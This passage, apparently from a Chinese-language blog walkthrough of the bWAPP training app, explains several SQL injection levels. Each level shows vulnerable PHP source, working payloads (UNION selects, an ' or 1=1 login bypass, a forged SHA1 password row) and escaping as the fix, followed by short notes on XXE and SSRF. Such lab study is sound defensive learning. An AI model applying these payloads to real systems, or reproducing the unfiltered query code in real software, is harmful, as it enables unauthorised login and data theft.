class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_POST[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和 GET 相同，只是提交数据的方式换成了 POST</p>
<h2 id="利用方式-11"><a href="#利用方式-11" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p>
<h2 id="防护方式-11"><a href="#防护方式-11" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p>
<h1 id="SQL-Injection-POST-Select"><a href="#SQL-Injection-POST-Select" class="headerlink" title="SQL Injection (POST/Select)"></a>SQL Injection (POST/Select)</h1><h2 id="产生原因-12"><a href="#产生原因-12" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_POST[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和 GET 相同，只是提交数据的方式换成了 POST</p>
<h2 id="利用方式-12"><a href="#利用方式-12" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p>
<h2 id="防护方式-12"><a href="#防护方式-12" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p>
<h1 id="SQL-Injection-AJAX-JSON-jQuery"><a href="#SQL-Injection-AJAX-JSON-jQuery" class="headerlink" title="SQL Injection (AJAX/JSON/jQuery)"></a>SQL Injection (AJAX/JSON/jQuery)</h1><h2 id="产生原因-13"><a href="#产生原因-13" class="headerlink" title="产生原因"></a>产生原因</h2><p>sqli_10-1.php</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">// Searches for a movie title</span></span><br><span class="line">	<span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AJAX call</span></span><br><span class="line">	$.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">		init_table();</span><br><span class="line">		<span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line">		<span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">		$.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;</span><br><span class="line">			total++;</span><br><span class="line">			$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">			&#125;);</span><br><span class="line">		<span class="comment">// Empty result</span></span><br><span class="line">		<span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_table</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"#table_yellow"</span>).html(<span class="string">"&lt;tr height='30' bgcolor='#ffb717' align='center'&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='200'&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='140'&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;/tr&gt;"</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>sqli_10-2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Encodes the result to JSON</span></span><br><span class="line"><span class="keyword">echo</span> json_encode($movies);</span><br></pre></td></tr></table></figure>

<p>这里是使用 Ajax 异步提交数据的方式，如果直接修改 URL 或者刷新页面是不会返回数据的</p>
<p>但是用 burp 抓包之后修改 title 就可以注入。这里注入的原理也是输入未过滤导致可以构造 sql 语句。</p>
<h2 id="利用方式-13"><a href="#利用方式-13" class="headerlink" title="利用方式"></a>利用方式</h2><p>抓包修改 title，构造 sql 语句，查看返回的 json 数据</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png" alt></p>
<h2 id="防护方式-13"><a href="#防护方式-13" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h1><h2 id="产生原因-14"><a href="#产生原因-14" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>])) </span><br><span class="line">&#123;   </span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理和前面的类似，只是在前面加了一个验证码的页面，防止工具注入，可以用脚本识别</p>
<h2 id="利用方式-14"><a href="#利用方式-14" class="headerlink" title="利用方式"></a>利用方式</h2><p>输入验证码之后进行注入</p>
<p>payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-14"><a href="#防护方式-14" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-Login-Form-Hero"><a href="#SQL-Injection-Login-Form-Hero" class="headerlink" title="SQL Injection (Login Form/Hero)"></a>SQL Injection (Login Form/Hero)</h1><h2 id="产生原因-15"><a href="#产生原因-15" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">    $login = sqli($login);</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">    $password = sqli($password);</span><br><span class="line">    </span><br><span class="line">    $sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $row = mysql_fetch_array($recordset);</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">"login"</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在表格中提交数据，且数据未过滤。</p>
<p>如果 login 输入 <code>1&#39; or 1=1 or &#39;1</code>，password 输入任意密码，那么查询语句变为 <code>SELECT * FROM heroes WHERE login = &#39;1&#39; or 1=1 or &#39;1&#39; AND password = &#39;xxxx&#39;</code>，由于 sql 语句的逻辑运算，这个语句恒真，即无论输入什么密码，都能登陆，又叫万能密码</p>
<h2 id="利用方式-15"><a href="#利用方式-15" class="headerlink" title="利用方式"></a>利用方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">1</span><span class="string">' or 1=1 or '</span><span class="number">1</span></span><br><span class="line">password : 随意</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-15"><a href="#防护方式-15" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-Login-Form-User"><a href="#SQL-Injection-Login-Form-User" class="headerlink" title="SQL Injection (Login Form/User)"></a>SQL Injection (Login Form/User)</h1><h2 id="产生原因-16"><a href="#产生原因-16" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">$login = sqli($login);</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$password = sqli($password);</span><br><span class="line">$password = hash(<span class="string">"sha1"</span>, $password, <span class="keyword">false</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">$recordset = mysql_query($sql, $link);</span><br><span class="line"><span class="keyword">if</span>(!$recordset)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$row = mysql_fetch_array($recordset);</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">"login"</span>] &amp;&amp; $password == $row[<span class="string">"password"</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		$message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理和前面类似，也是没有过滤输入，这样就可以构造 sql 语句</p>
<p>这里代码逻辑就是先查询 login 再用查询的结果判断有没有和 password 的 sha1 相同的账号</p>
<h2 id="利用方式-16"><a href="#利用方式-16" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">-1</span><span class="string">' union select 1,2,"356a192b7913b04c54574d18c28d46e6395428ab",4,5,6,7,8,9#</span></span><br><span class="line"><span class="string">password : 1</span></span><br></pre></td></tr></table></figure>

<p>查询语句变为 <code>SELECT * FROM users WHERE login = &#39;-1&#39; union select 1,2,&quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;,4,5,6,7,8,9#</code>，这样查询结果就会多一个 union，依靠经验 1 对应 id，2 对应 username，3 对应 password，所以在 3 的位置填入密码的 sha1 值，这样就能构造出来用户为 2，密码为 1 的用户了</p>
<h2 id="防护方式-16"><a href="#防护方式-16" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection (SQLite)"></a>SQL Injection (SQLite)</h1><h2 id="产生原因-17"><a href="#产生原因-17" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-17"><a href="#利用方式-17" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-17"><a href="#防护方式-17" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Drupal"><a href="#SQL-Injection-Drupal" class="headerlink" title="SQL Injection (Drupal)"></a>SQL Injection (Drupal)</h1><h2 id="产生原因-18"><a href="#产生原因-18" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-18"><a href="#利用方式-18" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-18"><a href="#防护方式-18" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-Blog"><a href="#SQL-Injection-Stored-Blog" class="headerlink" title="SQL Injection - Stored (Blog)"></a>SQL Injection - Stored (Blog)</h1><h2 id="产生原因-19"><a href="#产生原因-19" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-19"><a href="#利用方式-19" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-19"><a href="#防护方式-19" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-SQLite"><a href="#SQL-Injection-Stored-SQLite" class="headerlink" title="SQL Injection - Stored (SQLite)"></a>SQL Injection - Stored (SQLite)</h1><h2 id="产生原因-20"><a href="#产生原因-20" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-20"><a href="#利用方式-20" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-20"><a href="#防护方式-20" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-User-Agent"><a href="#SQL-Injection-Stored-User-Agent" class="headerlink" title="SQL Injection - Stored (User-Agent)"></a>SQL Injection - Stored (User-Agent)</h1><h2 id="产生原因-21"><a href="#产生原因-21" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-21"><a href="#利用方式-21" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-21"><a href="#防护方式-21" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-XML"><a href="#SQL-Injection-Stored-XML" class="headerlink" title="SQL Injection - Stored (XML)"></a>SQL Injection - Stored (XML)</h1><h2 id="产生原因-22"><a href="#产生原因-22" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-22"><a href="#利用方式-22" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-22"><a href="#防护方式-22" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Boolean-Based"><a href="#SQL-Injection-Blind-Boolean-Based" class="headerlink" title="SQL Injection - Blind - Boolean-Based"></a>SQL Injection - Blind - Boolean-Based</h1><h2 id="产生原因-23"><a href="#产生原因-23" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-23"><a href="#利用方式-23" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-23"><a href="#防护方式-23" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Time-Based"><a href="#SQL-Injection-Blind-Time-Based" class="headerlink" title="SQL Injection - Blind - Time-Based"></a>SQL Injection - Blind - Time-Based</h1><h2 id="产生原因-24"><a href="#产生原因-24" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-24"><a href="#利用方式-24" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-24"><a href="#防护方式-24" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-SQLite"><a href="#SQL-Injection-Blind-SQLite" class="headerlink" title="SQL Injection - Blind (SQLite)"></a>SQL Injection - Blind (SQLite)</h1><h2 id="产生原因-25"><a href="#产生原因-25" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-25"><a href="#利用方式-25" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-25"><a href="#防护方式-25" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Web-Services-SOAP"><a href="#SQL-Injection-Blind-Web-Services-SOAP" class="headerlink" title="SQL Injection - Blind (Web Services/SOAP)"></a>SQL Injection - Blind (Web Services/SOAP)</h1><h2 id="产生原因-26"><a href="#产生原因-26" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-26"><a href="#利用方式-26" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-26"><a href="#防护方式-26" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form)"></a>XML/XPath Injection (Login Form)</h1><h2 id="产生原因-27"><a href="#产生原因-27" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-27"><a href="#利用方式-27" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-27"><a href="#防护方式-27" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Search"><a href="#XML-XPath-Injection-Search" class="headerlink" title="XML/XPath Injection (Search)"></a>XML/XPath Injection (Search)</h1><h2 id="产生原因-28"><a href="#产生原因-28" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-28"><a href="#利用方式-28" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-28"><a href="#防护方式-28" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML 外部实体注入</p>
<p>以 XML 形式发送数据</p>
<p>实现 ssrf</p>
<p>读文件</p>
<p>执行命令</p>
<p>扫描端口</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
<li><p>服务端请求伪造，利用漏洞伪造服务器发送请求，从而获取内网数据</p>
</li>
<li><p>一般情况下，SSRF 的目标就是与外部隔离的内网资源。</p>
</li>
</ul>
<h3 id="SSRF-原理"><a href="#SSRF-原理" class="headerlink" title="SSRF 原理"></a>SSRF 原理</h3><p>服务端提供了从内网获取数据的功能，但没有对请求目标地址做过滤</p>
<h3 id="SSRF-用途"><a href="#SSRF-用途" class="headerlink" title="SSRF 用途"></a>SSRF 用途</h3><ul>
<li>内外网的端口和服务扫描，获取 Banner 信息</li>
<li>服务器本地敏感数据的读取</li>
<li>内外网主机应用程序漏洞的利用</li>
<li>内外网Web站点漏洞的利用 </li>
<li>……</li>
</ul>
<p>产生 SSRF 的 PHP 函数</p>
<p>file_get_content</p>
<p>fsockopen()</p>
<p>curl_exec()</p>
<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在传统的 Web 应用程序的工作方式下，客户端和浏览器之间的通信时同步的。比如，当用户在 Web 页面上填写好的表单，提交请求后就会发送到远程服务器上，经过处理之后，服务器再将处理的结果返回，这种行为反复执行，极大的浪费了网络带宽。</p>
<p>Ajax是由 JavaScript 与 CSS、XML、DOM 几种老技术加上 XMLHttpRequest 构成。使用 Ajax 技术后，客户端可以只向服务器传输更新过的内容，借助于客户端的 JavaScript 处理来自服务器的响应。比如，当用户在单击表单按钮时，会使用 JavaScript 和 DHTML 立即更新页面，并向服务器发送异步请求，以执行更新或查询数据库。当请求返回时，就可以只使用 JavaScript 和 CSS 来相应的更新页面，因为客户端和服务端只交互有用的数据，页面显示等不必要的数据便不再重新加载。</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul>
<li>搜索引擎能依照用户输入的关键词，自动列出最多人找到的关键词查询</li>
<li>注册模块中，用户填写完用户名后，系统会实时验证该用户名是否被注册</li>
</ul>
